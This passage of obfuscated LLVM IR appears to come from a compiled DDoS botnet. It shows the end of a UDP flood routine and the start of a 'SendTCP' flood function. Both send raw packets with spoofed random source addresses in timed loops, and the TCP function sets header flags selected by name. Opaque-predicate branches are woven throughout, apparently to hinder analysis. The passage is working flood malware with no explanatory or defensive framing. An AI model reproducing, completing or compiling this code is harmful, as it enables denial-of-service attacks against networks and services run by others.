  %268 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 7
  store i16 %267, i16* %269, align 2
  %270 = call i64 @time(i64* null) #5
  %271 = load i32, i32* %9, align 4
  %272 = sext i32 %271 to i64
  %273 = add nsw i64 %270, %272
  %274 = trunc i64 %273 to i32
  store i32 %274, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %275

; <label>:275:                                    ; preds = %361, %360, %247
  br label %276

; <label>:276:                                    ; preds = %275
  %277 = load i32, i32* %15, align 4
  %278 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %279 = call i64 @sendto(i32 %277, i8* %174, i64 %172, i32 0, %struct.sockaddr* %278, i32 16)
  %280 = call i32 @rand_cmwc()
  %281 = trunc i32 %280 to i16
  %282 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %283 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %282, i32 0, i32 0
  %284 = bitcast %union.anon.1* %283 to %struct.anon.2*
  %285 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %284, i32 0, i32 0
  store i16 %281, i16* %285, align 2
  %286 = load i32, i32* %8, align 4
  %287 = icmp eq i32 %286, 0
  br i1 %287, label %288, label %306

; <label>:288:                                    ; preds = %276
  %289 = load i32, i32* @x.73
  %290 = load i32, i32* @y.74
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %288
  %297 = call i32 @rand_cmwc()
  %298 = load i32, i32* @x.73
  %299 = load i32, i32* @y.74
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %327

; <label>:306:                                    ; preds = %276
  %307 = load i32, i32* @x.73
  %308 = load i32, i32* @y.74
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %306
  %315 = load i32, i32* %8, align 4
  %316 = trunc i32 %315 to i16
  %317 = call zeroext i16 @htons(i16 zeroext %316) #10
  %318 = zext i16 %317 to i32
  %319 = load i32, i32* @x.73
  %320 = load i32, i32* @y.74
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %327

; <label>:327:                                    ; preds = %originalBBpart243, %originalBBpart239
  %328 = phi i32 [ %297, %originalBBpart239 ], [ %318, %originalBBpart243 ]
  %329 = trunc i32 %328 to i16
  %330 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %331 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %330, i32 0, i32 0
  %332 = bitcast %union.anon.1* %331 to %struct.anon.2*
  %333 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %332, i32 0, i32 1
  store i16 %329, i16* %333, align 2
  %334 = call i32 @rand_cmwc()
  %335 = trunc i32 %334 to i16
  %336 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i32 0, i32 3
  store i16 %335, i16* %337, align 4
  %338 = load i32, i32* %18, align 4
  %339 = call i32 @getRandomIP(i32 %338)
  %340 = call i32 @htonl(i32 %339) #10
  %341 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %342 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %341, i32 0, i32 8
  store i32 %340, i32* %342, align 4
  %343 = bitcast i8* %174 to i16*
  %344 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %345 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %344, i32 0, i32 2
  %346 = load i16, i16* %345, align 2
  %347 = zext i16 %346 to i32
  %348 = call zeroext i16 @csum(i16* %343, i32 %347)
  %349 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %350 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %349, i32 0, i32 7
  store i16 %348, i16* %350, align 2
  %351 = load i32, i32* %23, align 4
  %352 = load i32, i32* %14, align 4
  %353 = icmp eq i32 %351, %352
  br i1 %353, label %354, label %361

; <label>:354:                                    ; preds = %327
  %355 = call i64 @time(i64* null) #5
  %356 = load i32, i32* %22, align 4
  %357 = sext i32 %356 to i64
  %358 = icmp sgt i64 %355, %357
  br i1 %358, label %359, label %360

; <label>:359:                                    ; preds = %354
  br label %364

; <label>:360:                                    ; preds = %354
  store i32 0, i32* %23, align 4
  br label %275

; <label>:361:                                    ; preds = %327
  %362 = load i32, i32* %23, align 4
  %363 = add i32 %362, 1
  store i32 %363, i32* %23, align 4
  br label %275

; <label>:364:                                    ; preds = %359
  %365 = load i32, i32* @x.73
  %366 = load i32, i32* @y.74
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %364
  %373 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %373)
  %374 = load i32, i32* @x.73
  %375 = load i32, i32* @y.74
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %382

; <label>:382:                                    ; preds = %originalBBpart247, %originalBBpart212, %81, %originalBBpart24
  %383 = load i32, i32* @x.73
  %384 = load i32, i32* @y.74
  %385 = sub i32 %383, 1
  %386 = mul i32 %383, %385
  %387 = urem i32 %386, 2
  %388 = icmp eq i32 %387, 0
  %389 = icmp slt i32 %384, 10
  %390 = or i1 %388, %389
  br i1 %390, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %382
  %391 = load i32, i32* @x.73
  %392 = load i32, i32* @y.74
  %393 = sub i32 %391, 1
  %394 = mul i32 %391, %393
  %395 = urem i32 %394, 2
  %396 = icmp eq i32 %395, 0
  %397 = icmp slt i32 %392, 10
  %398 = or i1 %396, %397
  br i1 %398, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %36
  %399 = load i8*, i8** %7, align 8
  %400 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %401 = call i32 @getHost(i8* %399, %struct.in_addr* %400)
  %402 = icmp ne i32 %401, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %57
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %82
  store i32 1, i32* %16, align 4
  %403 = load i32, i32* %15, align 4
  %404 = bitcast i32* %16 to i8*
  %405 = call i32 @setsockopt(i32 %403, i32 0, i32 3, i8* %404, i32 4) #5
  %406 = icmp slt i32 %405, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %103
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %120
  store i32 50, i32* %17, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %141
  %407 = call i64 @time(i64* null) #5
  %408 = call i32 @rand_cmwc()
  %409 = zext i32 %408 to i64
  %_ = shl i64 %407, %409
  %_19 = shl i64 %407, %409
  %_20 = shl i64 %407, %409
  %_21 = sub i64 0, %407
  %gen = add i64 %_21, %409
  %_22 = shl i64 %407, %409
  %_23 = sub i64 %407, %409
  %gen24 = mul i64 %_23, %409
  %410 = xor i64 %407, %409
  %411 = trunc i64 %410 to i32
  call void @srand(i32 %411) #5
  %412 = call i32 @rand() #5
  call void @init_rand(i32 %412)
  br label %originalBB18

originalBB29alteredBB:                            ; preds = %originalBB29, %208
  %413 = call i32 @rand_cmwc()
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %226
  %414 = load i32, i32* %8, align 4
  %415 = trunc i32 %414 to i16
  %416 = call zeroext i16 @htons(i16 zeroext %415) #10
  %417 = zext i16 %416 to i32
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %288
  %418 = call i32 @rand_cmwc()
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %306
  %419 = load i32, i32* %8, align 4
  %420 = trunc i32 %419 to i16
  %421 = call zeroext i16 @htons(i16 zeroext %420) #10
  %422 = zext i16 %421 to i32
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %364
  %423 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %423)
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %382
  br label %originalBB49
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %55

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* @x.75
  %36 = load i32, i32* @y.76
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = load i32, i32* %9, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #10
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  %47 = load i32, i32* @x.75
  %48 = load i32, i32* @y.76
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %55

; <label>:55:                                     ; preds = %originalBBpart2, %30
  %56 = load i32, i32* @x.75
  %57 = load i32, i32* @y.76
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = load i8*, i8** %8, align 8
  %65 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %66 = call i32 @getHost(i8* %64, %struct.in_addr* %65)
  %67 = icmp ne i32 %66, 0
  %68 = load i32, i32* @x.75
  %69 = load i32, i32* @y.76
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %67, label %76, label %77

; <label>:76:                                     ; preds = %originalBBpart24
  br label %697

; <label>:77:                                     ; preds = %originalBBpart24
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %79 = getelementptr inbounds [8 x i8], [8 x i8]* %78, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %79, i8 0, i64 8, i32 4, i1 false)
  %80 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %80, i32* %17, align 4
  %81 = load i32, i32* %17, align 4
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %84, label %83

; <label>:83:                                     ; preds = %77
  br label %697

; <label>:84:                                     ; preds = %77
  %85 = load i32, i32* @x.75
  %86 = load i32, i32* @y.76
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %84
  store i32 1, i32* %18, align 4
  %93 = load i32, i32* %17, align 4
  %94 = bitcast i32* %18 to i8*
  %95 = call i32 @setsockopt(i32 %93, i32 0, i32 3, i8* %94, i32 4) #5
  %96 = icmp slt i32 %95, 0
  %97 = load i32, i32* @x.75
  %98 = load i32, i32* @y.76
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %96, label %105, label %122

; <label>:105:                                    ; preds = %originalBBpart28
  %106 = load i32, i32* @x.75
  %107 = load i32, i32* @y.76
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %105
  %114 = load i32, i32* @x.75
  %115 = load i32, i32* @y.76
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %697

; <label>:122:                                    ; preds = %originalBBpart28
  %123 = load i32, i32* %14, align 4
  %124 = icmp eq i32 %123, 0
  br i1 %124, label %125, label %142

; <label>:125:                                    ; preds = %122
  %126 = load i32, i32* @x.75
  %127 = load i32, i32* @y.76
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %125
  store i32 0, i32* %19, align 4
  %134 = load i32, i32* @x.75
  %135 = load i32, i32* @y.76
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %164

; <label>:142:                                    ; preds = %122
  %143 = load i32, i32* @x.75
  %144 = load i32, i32* @y.76
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %142
  %151 = load i32, i32* %14, align 4
  %152 = sub nsw i32 32, %151
  %153 = shl i32 1, %152
  %154 = sub nsw i32 %153, 1
  %155 = xor i32 %154, -1
  store i32 %155, i32* %19, align 4
  %156 = load i32, i32* @x.75
  %157 = load i32, i32* @y.76
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart255, label %originalBB18alteredBB

originalBBpart255:                                ; preds = %originalBB18
  br label %164

; <label>:164:                                    ; preds = %originalBBpart255, %originalBBpart216
  %165 = load i32, i32* %12, align 4
  %166 = sext i32 %165 to i64
  %167 = add i64 40, %166
  %168 = call i8* @llvm.stacksave()
  store i8* %168, i8** %20, align 8
  %169 = alloca i8, i64 %167, align 16
  %170 = bitcast i8* %169 to %struct.iphdr*
  store %struct.iphdr* %170, %struct.iphdr** %21, align 8
  %171 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %172 = bitcast %struct.iphdr* %171 to i8*
  %173 = getelementptr i8, i8* %172, i64 20
  %174 = bitcast i8* %173 to %struct.tcphdr*
  store %struct.tcphdr* %174, %struct.tcphdr** %22, align 8
  %175 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %176 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %177 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %176, i32 0, i32 0
  %178 = load i32, i32* %177, align 4
  %179 = load i32, i32* %19, align 4
  %180 = call i32 @getRandomIP(i32 %179)
  %181 = call i32 @htonl(i32 %180) #10
  %182 = load i32, i32* %12, align 4
  %183 = sext i32 %182 to i64
  %184 = add i64 20, %183
  %185 = trunc i64 %184 to i32
  call void @makeIPPacket(%struct.iphdr* %175, i32 %178, i32 %181, i8 zeroext 6, i32 %185)
  %186 = call i32 @rand_cmwc()
  %187 = trunc i32 %186 to i16
  %188 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 0
  %190 = bitcast %union.anon* %189 to %struct.anon.0*
  %191 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %190, i32 0, i32 0
  store i16 %187, i16* %191, align 4
  %192 = call i32 @rand_cmwc()
  %193 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %194 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %193, i32 0, i32 0
  %195 = bitcast %union.anon* %194 to %struct.anon.0*
  %196 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %195, i32 0, i32 2
  store i32 %192, i32* %196, align 4
  %197 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %198 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %197, i32 0, i32 0
  %199 = bitcast %union.anon* %198 to %struct.anon.0*
  %200 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %199, i32 0, i32 3
  store i32 0, i32* %200, align 4
  %201 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %202 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %201, i32 0, i32 0
  %203 = bitcast %union.anon* %202 to %struct.anon.0*
  %204 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %203, i32 0, i32 4
  %205 = load i16, i16* %204, align 4
  %206 = and i16 %205, -241
  %207 = or i16 %206, 80
  store i16 %207, i16* %204, align 4
  %208 = load i8*, i8** %11, align 8
  %209 = call i32 @strcmp(i8* %208, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.152, i32 0, i32 0)) #9
  %210 = icmp ne i32 %209, 0
  br i1 %210, label %270, label %211

; <label>:211:                                    ; preds = %164
  %212 = load i32, i32* @x.75
  %213 = load i32, i32* @y.76
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %211
  %220 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 0
  %222 = bitcast %union.anon* %221 to %struct.anon.0*
  %223 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %222, i32 0, i32 4
  %224 = load i16, i16* %223, align 4
  %225 = and i16 %224, -513
  %226 = or i16 %225, 512
  store i16 %226, i16* %223, align 4
  %227 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 0
  %229 = bitcast %union.anon* %228 to %struct.anon.0*
  %230 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %229, i32 0, i32 4
  %231 = load i16, i16* %230, align 4
  %232 = and i16 %231, -1025
  %233 = or i16 %232, 1024
  store i16 %233, i16* %230, align 4
  %234 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 0
  %236 = bitcast %union.anon* %235 to %struct.anon.0*
  %237 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = and i16 %238, -257
  %240 = or i16 %239, 256
  store i16 %240, i16* %237, align 4
  %241 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %242 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %241, i32 0, i32 0
  %243 = bitcast %union.anon* %242 to %struct.anon.0*
  %244 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %243, i32 0, i32 4
  %245 = load i16, i16* %244, align 4
  %246 = and i16 %245, -4097
  %247 = or i16 %246, 4096
  store i16 %247, i16* %244, align 4
  %248 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 0
  %250 = bitcast %union.anon* %249 to %struct.anon.0*
  %251 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %250, i32 0, i32 4
  %252 = load i16, i16* %251, align 4
  %253 = and i16 %252, -2049
  %254 = or i16 %253, 2048
  store i16 %254, i16* %251, align 4
  %255 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 0
  %257 = bitcast %union.anon* %256 to %struct.anon.0*
  %258 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %257, i32 0, i32 4
  %259 = load i16, i16* %258, align 4
  %260 = and i16 %259, -8193
  %261 = or i16 %260, 8192
  store i16 %261, i16* %258, align 4
  %262 = load i32, i32* @x.75
  %263 = load i32, i32* @y.76
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBBpart2124, label %originalBB57alteredBB

originalBBpart2124:                               ; preds = %originalBB57
  br label %270

; <label>:270:                                    ; preds = %originalBBpart2124, %164
  %271 = load i32, i32* @x.75
  %272 = load i32, i32* @y.76
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %270
  %279 = load i8*, i8** %11, align 8
  %280 = call i32 @strcmp(i8* %279, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.153, i32 0, i32 0)) #9
  %281 = icmp ne i32 %280, 0
  %282 = load i32, i32* @x.75
  %283 = load i32, i32* @y.76
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %281, label %305, label %290

; <label>:290:                                    ; preds = %originalBBpart2128
  %291 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %292 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %291, i32 0, i32 0
  %293 = bitcast %union.anon* %292 to %struct.anon.0*
  %294 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %293, i32 0, i32 4
  %295 = load i16, i16* %294, align 4
  %296 = and i16 %295, -513
  %297 = or i16 %296, 512
  store i16 %297, i16* %294, align 4
  %298 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i32 0, i32 0
  %300 = bitcast %union.anon* %299 to %struct.anon.0*
  %301 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %300, i32 0, i32 4
  %302 = load i16, i16* %301, align 4
  %303 = and i16 %302, -8193
  %304 = or i16 %303, 8192
  store i16 %304, i16* %301, align 4
  br label %305

; <label>:305:                                    ; preds = %290, %originalBBpart2128
  %306 = load i8*, i8** %11, align 8
  %307 = call i32 @strcmp(i8* %306, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.154, i32 0, i32 0)) #9
  %308 = icmp ne i32 %307, 0
  br i1 %308, label %324, label %309

; <label>:309:                                    ; preds = %305
  %310 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i32 0, i32 0
  %312 = bitcast %union.anon* %311 to %struct.anon.0*
  %313 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %312, i32 0, i32 4
  %314 = load i16, i16* %313, align 4
  %315 = and i16 %314, -513
  %316 = or i16 %315, 512
  store i16 %316, i16* %313, align 4
  %317 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %318 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %317, i32 0, i32 0
  %319 = bitcast %union.anon* %318 to %struct.anon.0*
  %320 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %319, i32 0, i32 4
  %321 = load i16, i16* %320, align 4
  %322 = and i16 %321, -4097
  %323 = or i16 %322, 4096
  store i16 %323, i16* %320, align 4
  br label %555

; <label>:324:                                    ; preds = %305
  %325 = load i8*, i8** %11, align 8
  %326 = call i8* @strtok(i8* %325, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0)) #5
  store i8* %326, i8** %23, align 8
  br label %327

; <label>:327:                                    ; preds = %536, %324
  %328 = load i32, i32* @x.75
  %329 = load i32, i32* @y.76
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %327
  %336 = load i8*, i8** %23, align 8
  %337 = icmp ne i8* %336, null
  %338 = load i32, i32* @x.75
  %339 = load i32, i32* @y.76
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %337, label %346, label %538

; <label>:346:                                    ; preds = %originalBBpart2132
  %347 = load i32, i32* @x.75
  %348 = load i32, i32* @y.76
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %346
  %355 = load i8*, i8** %23, align 8
  %356 = call i32 @strcmp(i8* %355, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.156, i32 0, i32 0)) #9
